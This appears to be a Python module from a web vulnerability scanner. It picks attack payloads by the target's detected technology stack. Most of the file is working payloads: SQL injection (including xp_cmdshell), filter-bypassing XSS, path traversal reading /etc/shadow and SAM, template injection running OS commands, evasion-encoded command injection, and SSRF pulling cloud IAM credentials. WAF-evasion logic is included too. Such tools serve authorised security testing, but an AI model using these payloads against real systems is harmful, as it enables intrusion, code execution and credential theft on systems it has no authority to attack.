"""
Adaptive Scanning Engine v5.0.

Technology-aware scanning that adjusts strategy based on the target:
- Tech fingerprinting integration for targeted payload selection
- Progressive depth scanning (quick → full → aggressive)
- WAF-adaptive behavior with automatic evasion mode
- Rate limiting intelligence with auto-throttle
- DBMS-specific, framework-specific, and OS-specific payload routing
"""

from dataclasses import dataclass, field
from typing import List, Dict, Optional


@dataclass
class TargetProfile:
    """Aggregated intelligence about the scan target."""
    tech_stack: List[str] = field(default_factory=list)
    server: str = ""
    waf_detected: bool = False
    waf_vendor: str = ""
    os_hint: str = ""           # "linux", "windows", "unknown"
    language_hint: str = ""     # "php", "java", "python", "node", "asp", "ruby", "unknown"
    dbms_hint: str = ""         # "mysql", "postgres", "mssql", "oracle", "sqlite", "unknown"
    framework_hint: str = ""    # "wordpress", "django", "laravel", "spring", "express", etc.
    cdn_hint: str = ""          # "cloudflare", "akamai", "fastly", etc.
    has_forms: bool = False
    has_api: bool = False
    response_time_avg: float = 0.0
    rate_limit_detected: bool = False


class AdaptiveEngine:
    """
    Technology-aware scanning engine that tailors payloads
    and scanning strategy to the target's technology stack.
    """

    def __init__(self, profile: Optional[TargetProfile] = None):
        self.profile = profile or TargetProfile()

    def update_profile(self, **kwargs):
        """Update target profile with new intelligence."""
        for key, value in kwargs.items():
            if hasattr(self.profile, key):
                setattr(self.profile, key, value)

    def infer_from_tech_stack(self, tech_stack: List[str]):
        """Infer OS, language, DBMS, and framework from detected technologies."""
        self.profile.tech_stack = tech_stack
        tech_lower = ' '.join(tech_stack).lower()

        # OS inference
        if any(t in tech_lower for t in ['iis', 'asp.net', 'windows', 'kestrel']):
            self.profile.os_hint = "windows"
        elif any(t in tech_lower for t in ['apache', 'nginx', 'linux', 'ubuntu', 'debian', 'centos']):
            self.profile.os_hint = "linux"
        else:
            self.profile.os_hint = "unknown"

        # Language inference
        lang_map = {
            'php': ['php', 'laravel', 'wordpress', 'drupal', 'joomla', 'codeigniter', 'symfony'],
            'java': ['java', 'j2ee', 'spring', 'tomcat', 'jsessionid', 'jsp', 'struts'],
            'python': ['python', 'django', 'flask', 'gunicorn', 'uvicorn', 'fastapi'],
            'node': ['node', 'express', 'next.js', 'nuxt', 'connect.sid'],
            'asp': ['asp.net', 'iis', 'kestrel', 'asp.net_sessionid'],
            'ruby': ['ruby', 'rails', 'rack', 'passenger', 'puma', 'unicorn'],
        }
        for lang, indicators in lang_map.items():
            if any(ind in tech_lower for ind in indicators):
                self.profile.language_hint = lang
                break

        # DBMS inference (from language/framework hints)
        dbms_map = {
            'php': 'mysql',       # PHP most commonly uses MySQL
            'java': 'oracle',     # Java enterprise often uses Oracle
            'python': 'postgres', # Python frameworks often use PostgreSQL
            'asp': 'mssql',       # ASP.NET almost always uses MSSQL
            'ruby': 'postgres',   # Rails conventionally uses PostgreSQL
        }
        if self.profile.language_hint in dbms_map:
            self.profile.dbms_hint = dbms_map[self.profile.language_hint]

        # Framework inference
        framework_map = {
            'wordpress': 'wordpress', 'drupal': 'drupal', 'joomla': 'joomla',
            'laravel': 'laravel', 'django': 'django', 'flask': 'flask',
            'spring': 'spring', 'express': 'express', 'next.js': 'nextjs',
            'rails': 'rails', 'angular': 'angular', 'react': 'react', 'vue': 'vue',
        }
        for key, fw in framework_map.items():
            if key in tech_lower:
                self.profile.framework_hint = fw
                break

        # CDN inference
        cdn_map = {
            'cloudflare': 'cloudflare', 'akamai': 'akamai', 'fastly': 'fastly',
            'cloudfront': 'cloudfront', 'vercel': 'vercel', 'azure cdn': 'azure',
        }
        for key, cdn in cdn_map.items():
            if key in tech_lower:
                self.profile.cdn_hint = cdn
                break

    # ── SQL Injection Payload Selection ─────────────────────────────────

    def get_sqli_payloads(self) -> Dict[str, list]:
        """Return DBMS-targeted SQL injection payloads."""
        base_error = [
            "'", "\"", "' OR '1'='1", "' OR '1'='1' --",
            "' OR '1'='1' /*", '\" OR \"1\"=\"1', "1' ORDER BY 100--",
            "') OR ('1'='1", "1 UNION SELECT NULL--",
        ]

        base_time = [
            ("' AND SLEEP(5)-- ", 5),
            ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ", 5),
            ("1 OR SLEEP(5)=", 5),
        ]

        base_boolean = [
            ("' AND '1'='1' --", "' AND '1'='2' --"),
            ("' AND 1=1 --", "' AND 1=2 --"),
            ('\" AND \"1\"=\"1\" --', '\" AND \"1\"=\"2\" --'),
            ("1 AND 1=1", "1 AND 1=2"),
        ]

        # DBMS-specific additions
        dbms = self.profile.dbms_hint

        if dbms == "mysql":
            base_error.extend([
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--",
                "' AND UPDATEXML(1, CONCAT(0x7e, VERSION()), 1)--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
                "' AND JSON_EXTRACT('{\"a\":1}', CONCAT('$', (SELECT VERSION())))--",
                "' UNION SELECT NULL,@@version,NULL--",
                "' AND IF(1=1,BENCHMARK(5000000,SHA1('test')),0)--",
            ])
            base_time.extend([
                ("' AND BENCHMARK(10000000,MD5('a'))--", 5),
                ("' AND IF(1=1,SLEEP(5),0)--", 5),
            ])

        elif dbms == "postgres":
            base_error.extend([
                "' AND CAST(VERSION() AS INT)--",
                "' AND 1=CAST((SELECT version()) AS INT)--",
                "'; SELECT PG_SLEEP(5)--",
                "' UNION SELECT NULL,version(),NULL--",
                "' AND LENGTH(version())>0--",
            ])
            base_time.extend([
                ("'; SELECT pg_sleep(5)--", 5),
                ("' AND (SELECT pg_sleep(5)) IS NOT NULL--", 5),
            ])

        elif dbms == "mssql":
            base_error.extend([
                "' AND 1=CONVERT(INT, @@version)--",
                "' AND 1=db_name()--",
                "'; EXEC xp_cmdshell('whoami')--",
                "' UNION SELECT NULL,@@version,NULL--",
                "' AND SUBSTRING(@@version,1,1)='M'--",
            ])
            base_time.extend([
                ("'; WAITFOR DELAY '0:0:5'--", 5),
                ("' AND 1=(SELECT CASE WHEN (1=1) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)--", 0),
            ])

        elif dbms == "oracle":
            base_error.extend([
                "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
                "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
                "' UNION SELECT NULL,banner,NULL FROM v$version--",
                "' AND EXTRACTVALUE(XMLType('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"x\"> %remote;]>'),'/l')--",
            ])
            base_time.extend([
                ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),
            ])

        elif dbms == "sqlite":
            base_error.extend([
                "' AND sqlite_version()=sqlite_version()--",
                "' UNION SELECT NULL,sqlite_version(),NULL--",
                "' AND RANDOMBLOB(100000000)--",
            ])

        # NoSQL injection payloads (MongoDB)
        nosql = [
            '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
            '{"$gt":""},"$or":[{"a":"b"}]',
            "' || '1'=='1", "true, $where: '1 == 1'",
            ";return true;", "';return true;var a='",
        ]

        # Second-order / Union-based
        union = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION ALL SELECT 1,2,3,4--",
            "' UNION ALL SELECT 1,2,3,4,5--",
        ]

        return {
            "error": base_error,
            "time": base_time,
            "boolean": base_boolean,
            "nosql": nosql,
            "union": union,
        }

    # ── XSS Payload Selection ──────────────────────────────────────────

    def get_xss_payloads(self) -> Dict[str, list]:
        """Return context-targeted XSS payloads."""
        reflected = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '" onmouseover="alert(1)"',
            '"><img src=x onerror=alert(1)>',
            '"><svg/onload=alert(1)>',
            "'><svg onload=alert(1)>",
            '<ScRiPt>alert(1)</ScRiPt>',
            '<img src=x onerror=alert`1`>',
            '<details open ontoggle=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            "';alert(1)//",
            '";alert(1)//',
            '<body onload=alert(1)>',
            # New v5.0 payloads
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><set onbegin=alert(1) attributename=x to=1>',
            '<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">',
            '<iframe srcdoc="<script>alert(1)</script>">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<isindex type=image src=x onerror=alert(1)>',
            '<input type=image src=x onerror=alert(1)>',
            '<form><button formaction="javascript:alert(1)">X</button>',
            '<base href="javascript:/a/-alert(1)///////">',
            '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>',
        ]

        # DOM-specific payloads
        dom = [
            '#<img src=x onerror=alert(1)>',
            'javascript:alert(document.domain)',
            '"><img src=x onerror=alert(document.domain)>',
        ]

        # Polyglot XSS
        polyglot = [
            "'\"-->]]>*/</script></style></title></textarea></noscript><svg/onload=alert(1)>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )",
            '<svg/onload=alert(1)//]]>-->',
        ]

        # Mutation XSS (DOMPurify bypass)
        mutation = [
            '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
            '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(1) /></svg>#x">',
            '<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=x><animate attributeName=href values=javascript:alert(1) /><set attributeName=href values=javascript:alert(1) />',
        ]

        # Encoding-based XSS
        encoded = [
            '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
            '<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
            '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        ]

        return {
            "reflected": reflected,
            "dom": dom,
            "polyglot": polyglot,
            "mutation": mutation,
            "encoded": encoded,
        }

    # ── LFI Payload Selection ──────────────────────────────────────────

    def get_lfi_payloads(self) -> list:
        """Return OS-targeted LFI payloads."""
        os_hint = self.profile.os_hint
        lang = self.profile.language_hint

        linux_paths = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",  # Double encoding
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",  # UTF-8 overlong
            "....\\\\....\\\\....\\\\etc\\\\passwd",
            "../../../etc/shadow",
            "../../../etc/hosts",
            "../../../proc/self/environ",
            "../../../proc/self/cmdline",
            "../../../proc/version",
            "/etc/passwd%00",
            "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/access.log",
            "../../../var/log/auth.log",
            "../../../var/log/syslog",
        ]

        windows_paths = [
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "..%255c..%255c..%255cwindows%255cwin.ini",  # Double encoding
            "C:\\boot.ini",
            "C:\\Windows\\System32\\config\\SAM",
            "..\\..\\..\\inetpub\\wwwroot\\web.config",
        ]

        php_wrappers = [
            "php://filter/convert.base64-encode/resource=index",
            "php://filter/convert.base64-encode/resource=config",
            "php://filter/convert.base64-encode/resource=../config",
            "php://filter/read=string.rot13/resource=index",
            "php://input",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "php://filter/convert.iconv.UTF-8.UTF-7/resource=index",
            "phar://test.phar/test.txt",
        ]

        # Build targeted list
        payloads = []

        if os_hint == "windows":
            payloads.extend(windows_paths)
            payloads.extend(linux_paths[:3])  # Still try Linux basics
        elif os_hint == "linux":
            payloads.extend(linux_paths)
            payloads.extend(windows_paths[:2])  # Still try Windows basics
        else:
            payloads.extend(linux_paths)
            payloads.extend(windows_paths)

        if lang == "php":
            payloads.extend(php_wrappers)
        else:
            payloads.extend(php_wrappers[:3])  # Try basic PHP wrappers anyway

        return payloads

    # ── SSTI Payload Selection ─────────────────────────────────────────

    def get_ssti_payloads(self) -> list:
        """Return framework-targeted SSTI payloads."""
        lang = self.profile.language_hint
        fw = self.profile.framework_hint

        base_payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("#{7*7}", "49"),
            ("{{=7*7}}", "49"),
            ("${{7*7}}", "49"),
        ]

        # Jinja2 (Python - Flask/Django)
        jinja2 = [
            ("{{config}}", "__class__"),
            ("{{self.__class__.__mro__}}", "__class__"),
            ("{{''.__class__.__mro__[1].__subclasses__()}}", "subprocess"),
            ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "uid="),
            ("{{lipsum.__globals__.os.popen('id').read()}}", "uid="),
        ]

        # Twig (PHP - Symfony/Laravel)
        twig = [
            ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid="),
            ("{{['id']|filter('system')}}", "uid="),
            ("{{app.request.server.all|join(',')}}", "SERVER"),
        ]

        # Freemarker (Java)
        freemarker = [
            ("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "uid="),
            ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "uid="),
        ]

        # Velocity (Java)
        velocity = [
            ("#set($rt=$class.forName('java.lang.Runtime'))#set($ex=$rt.getMethod('getRuntime').invoke($rt))$ex.exec('id')", "Process"),
        ]

        # Pebble (Java)
        pebble = [
            ("{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]))}}", "uid="),
        ]

        # EL (Java Expression Language)
        el = [
            ("${T(java.lang.Runtime).getRuntime().exec('id')}", "Process"),
            ("${applicationScope}", "javax"),
            ("#{T(java.lang.Runtime).getRuntime().exec('id')}", "Process"),
        ]

        # Smarty (PHP)
        smarty = [
            ("{php}echo `id`;{/php}", "uid="),
            ("{system('id')}", "uid="),
        ]

        # Mako (Python)
        mako = [
            ("${__import__('os').popen('id').read()}", "uid="),
            ("<%import os;x=os.popen('id').read()%>${x}", "uid="),
        ]

        payloads = list(base_payloads)

        if lang == "python":
            payloads.extend(jinja2)
            payloads.extend(mako)
        elif lang == "php":
            payloads.extend(twig)
            payloads.extend(smarty)
        elif lang == "java":
            payloads.extend(freemarker)
            payloads.extend(velocity)
            payloads.extend(pebble)
            payloads.extend(el)
        else:
            # Unknown — try a broad set
            payloads.extend(jinja2[:2])
            payloads.extend(twig[:1])
            payloads.extend(freemarker[:1])
            payloads.extend(el[:1])
            payloads.extend(smarty[:1])
            payloads.extend(mako[:1])

        return payloads

    # ── Command Injection Payload Selection ────────────────────────────

    def get_cmdi_payloads(self) -> Dict[str, list]:
        """Return OS-targeted command injection payloads."""
        os_hint = self.profile.os_hint

        linux_output = [
            (";id", ["uid=", "gid="]),
            ("|id", ["uid=", "gid="]),
            ("$(id)", ["uid=", "gid="]),
            ("`id`", ["uid=", "gid="]),
            (";cat /etc/passwd", ["root:x:0:0"]),
            (";uname -a", ["Linux", "Darwin"]),
            ("&&id", ["uid=", "gid="]),
            (";whoami", ["root", "www-data", "apache", "nginx"]),
            ("| cat /etc/hostname", []),  # any output = success
            # Evasion payloads
            (";i${IFS}d", ["uid=", "gid="]),
            (";$'\\x69\\x64'", ["uid=", "gid="]),
            (";$(printf '\\x69\\x64')", ["uid=", "gid="]),
            (";{id,}", ["uid=", "gid="]),
            (";cat${IFS}/etc/passwd", ["root:x:0:0"]),
            (";\nid", ["uid=", "gid="]),
        ]

        windows_output = [
            ("& type C:\\Windows\\win.ini", ["[extensions]", "[fonts]"]),
            ("| type C:\\Windows\\win.ini", ["[extensions]", "[fonts]"]),
            ("& whoami", ["\\", "AUTHORITY"]),
            ("| whoami", ["\\", "AUTHORITY"]),
            ("& net user", ["User accounts", "Administrator"]),
            ("& ipconfig", ["Windows IP", "IPv4"]),
            ("| dir C:\\", ["Volume", "Directory"]),
            # PowerShell-specific
            ("; powershell -c whoami", ["\\", "AUTHORITY"]),
            ("| powershell -c Get-Process", ["Handles", "ProcessName"]),
        ]

        time_linux = [
            (";sleep 5", 5),
            ("|sleep 5", 5),
            ("$(sleep 5)", 5),
            ("`sleep 5`", 5),
            ("&&sleep 5", 5),
            (";sleep${IFS}5", 5),
            # Evasion
            (";sl$(printf '')eep 5", 5),
        ]

        time_windows = [
            ("& ping -n 6 127.0.0.1", 5),
            ("| ping -n 6 127.0.0.1", 5),
            ("& timeout /t 5 /nobreak", 5),
            ("; powershell -c Start-Sleep -s 5", 5),
        ]

        if os_hint == "windows":
            return {
                "output": windows_output + linux_output[:4],
                "time": time_windows + time_linux[:2],
            }
        elif os_hint == "linux":
            return {
                "output": linux_output + windows_output[:2],
                "time": time_linux + time_windows[:1],
            }
        else:
            return {
                "output": linux_output + windows_output,
                "time": time_linux + time_windows,
            }

    # ── SSRF Payload Selection ─────────────────────────────────────────

    def get_ssrf_payloads(self) -> list:
        """Return cloud-aware SSRF payloads."""
        base = [
            ("http://127.0.0.1", ["root:x:0:0", "localhost", "ssh", "mysql"]),
            ("http://localhost", ["root:x:0:0", "localhost", "html"]),
            ("http://[::1]", ["root:x:0:0", "localhost"]),
            ("http://0x7f000001", ["root:x:0:0", "localhost"]),
            ("http://0177.0.0.1", []),  # Octal
            ("http://2130706433", []),   # Decimal
            ("http://127.1", []),
        ]

        # Cloud metadata endpoints
        cloud = [
            # AWS IMDSv1
            ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "iam"]),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
            ("http://169.254.169.254/latest/user-data", []),
            # GCP
            ("http://metadata.google.internal/computeMetadata/v1/", ["attributes", "instance"]),
            ("http://169.254.169.254/computeMetadata/v1/", ["attributes", "instance"]),
            # Azure
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute", "network"]),
            # DigitalOcean
            ("http://169.254.169.254/metadata/v1/", ["hostname", "region"]),
            # Alibaba Cloud
            ("http://100.100.100.200/latest/meta-data/", ["instance-id"]),
        ]

        # Protocol handlers
        protocols = [
            ("file:///etc/passwd", ["root:x:0:0"]),
            ("file:///etc/hostname", []),
            ("file:///C:/Windows/win.ini", ["[extensions]", "[fonts]"]),
            ("dict://127.0.0.1:6379/INFO", ["redis_version"]),
            ("gopher://127.0.0.1:6379/_INFO", ["redis_version"]),
        ]

        # DNS rebinding / redirect bypass
        redirect = [
            ("http://spoofed.burpcollaborator.net", []),
            ("http://localtest.me", []),  # Resolves to 127.0.0.1
            ("http://127.0.0.1.nip.io", []),
        ]

        return base + cloud + protocols + redirect

    # ── Scanning Strategy ──────────────────────────────────────────────

    def get_intensity_profile(self, intensity: int) -> dict:
        """
        Return scanning parameters based on intensity level.

        Intensity levels:
            1 = Quick   (3-5 payloads, 1 thread, no mutation)
            2 = Standard (all payloads, moderate threads, no mutation)
            3 = Thorough (all payloads, more threads, basic mutation)
            4 = Aggressive (all payloads + mutation + deep analysis)
        """
        profiles = {
            1: {
                "max_payloads_per_type": 5,
                "max_workers": 10,
                "enable_mutation": False,
                "mutation_intensity": 0,
                "enable_time_based": False,
                "enable_form_testing": False,
                "crawl_depth": 1,
                "crawl_max_urls": 30,
                "time_verify_rounds": 0,
            },
            2: {
                "max_payloads_per_type": 20,
                "max_workers": 20,
                "enable_mutation": False,
                "mutation_intensity": 0,
                "enable_time_based": True,
                "enable_form_testing": True,
                "crawl_depth": 2,
                "crawl_max_urls": 100,
                "time_verify_rounds": 1,
            },
            3: {
                "max_payloads_per_type": 50,
                "max_workers": 30,
                "enable_mutation": True,
                "mutation_intensity": 2,
                "enable_time_based": True,
                "enable_form_testing": True,
                "crawl_depth": 3,
                "crawl_max_urls": 200,
                "time_verify_rounds": 2,
            },
            4: {
                "max_payloads_per_type": 999,
                "max_workers": 50,
                "enable_mutation": True,
                "mutation_intensity": 3,
                "enable_time_based": True,
                "enable_form_testing": True,
                "crawl_depth": 4,
                "crawl_max_urls": 500,
                "time_verify_rounds": 3,
            },
        }
        return profiles.get(intensity, profiles[2])

    def should_deepen(self, signals: dict) -> bool:
        """
        Determine if a parameter warrants deeper testing based on initial signals.

        If any signal fired (response diff, status change, timing), the parameter
        is likely injectable and deserves the full payload + mutation treatment.
        """
        return any(
            v is True or (isinstance(v, (int, float)) and v > 0)
            for v in signals.values()
        )

    def get_rate_limit_delay(self) -> float:
        """Calculate appropriate request delay based on target behavior."""
        if self.profile.rate_limit_detected:
            return 2.0  # Aggressive backoff
        if self.profile.waf_detected:
            return 0.5  # Moderate delay to avoid blocks
        if self.profile.cdn_hint:
            return 0.1  # CDNs can handle traffic
        return 0.05     # Default fast scan


# ── Singleton instance ──────────────────────────────────────────────────
adaptive = AdaptiveEngine()
